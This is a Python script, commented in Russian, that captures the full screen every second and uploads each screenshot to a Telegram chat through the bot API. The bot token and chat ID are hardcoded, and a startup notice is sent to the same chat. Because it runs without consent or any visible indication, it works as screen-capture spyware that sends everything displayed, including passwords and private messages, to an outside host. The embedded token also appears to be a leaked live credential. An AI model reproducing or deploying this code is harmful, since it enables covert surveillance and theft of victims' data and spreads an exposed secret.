import time
import pyautogui
import requests
from io import BytesIO
import logging
from datetime import datetime

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Конфигурация
TELEGRAM_BOT_TOKEN = "8424714556:AAFOcDaCiiVnu0T0X8IeUHs_lf4ZniaV1cw"
TELEGRAM_CHAT_ID = "2085708753"
SCREENSHOT_INTERVAL = 1  # секунды

def take_screenshot():
    """Сделать скриншот экрана"""
    try:
        screenshot = pyautogui.screenshot()
        return screenshot
    except Exception as e:
        logging.error(f"Ошибка при создании скриншота: {e}")
        return None

def send_to_telegram(screenshot, caption=None):
    """Отправить скриншот в Telegram"""
    try:
        # Конвертируем скриншот в байты
        img_byte_arr = BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        
        # Формируем URL для отправки фото
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        
        # Подготавливаем данные для отправки
        files = {'photo': ('screenshot.png', img_byte_arr, 'image/png')}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        
        if caption:
            data['caption'] = caption
        
        # Отправляем запрос
        response = requests.post(url, files=files, data=data)
        
        if response.status_code == 200:
            logging.info(f"Скриншот успешно отправлен в {datetime.now().strftime('%H:%M:%S')}")
        else:
            logging.error(f"Ошибка отправки: {response.status_code} - {response.text}")
            
    except Exception as e:
        logging.error(f"Ошибка при отправке в Telegram: {e}")

def send_startup_message():
    """Отправить сообщение о начале работы"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': f"🖥️ Скриншотер запущен!\nНачало работы: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nИнтервал: {SCREENSHOT_INTERVAL} сек."
        }
        requests.post(url, data=data)
        logging.info("Сообщение о запуске отправлено")
    except Exception as e:
        logging.error(f"Ошибка отправки startup сообщения: {e}")

def main():
    """Основной цикл программы"""
    logging.info("Запуск скриншотера...")
    send_startup_message()
    
    try:
        while True:
            # Делаем скриншот
            screenshot = take_screenshot()
            
            if screenshot:
                # Создаем подпись с текущим временем
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                caption = f"Скриншот: {timestamp}"
                
                # Отправляем скриншот
                send_to_telegram(screenshot, caption)
            
            # Ждем указанный интервал
            time.sleep(SCREENSHOT_INTERVAL)
            
    except KeyboardInterrupt:
        logging.info("\nСкриншотер остановлен пользователем")
    except Exception as e:
        logging.error(f"Критическая ошибка: {e}")

if __name__ == "__main__":
    # Проверка наличия необходимых библиотек
    try:
        import pyautogui
        import requests
    except ImportError:
        print("Установите необходимые библиотеки:")
        print("pip install pyautogui requests pillow")
        exit(1)
    
    main()
